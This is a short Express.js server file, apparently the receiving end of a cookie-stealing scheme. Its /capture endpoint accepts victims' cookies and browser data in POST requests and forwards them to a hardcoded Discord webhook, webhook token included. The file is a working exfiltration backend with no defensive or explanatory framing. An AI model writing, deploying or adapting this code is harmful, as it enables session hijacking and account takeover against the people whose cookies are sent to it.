const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/capture', (req, res) => {
    const { cookies, browserData } = req.body;
    const webhookUrl = 'https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL';

    const data = {
        content: `Cookies: ${JSON.stringify(cookies)}\nBrowser Data: ${JSON.stringify(browserData)}`
    };

    request.post(webhookUrl, { json: data }, (error, response, body) => {
        if (error) {
            console.error('Error sending to Discord:', error);
            res.status(500).send('Error sending to Discord');
        } else {
            console.log('Data sent to Discord:', body);
            res.status(200).send('Data captured and sent to Discord');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
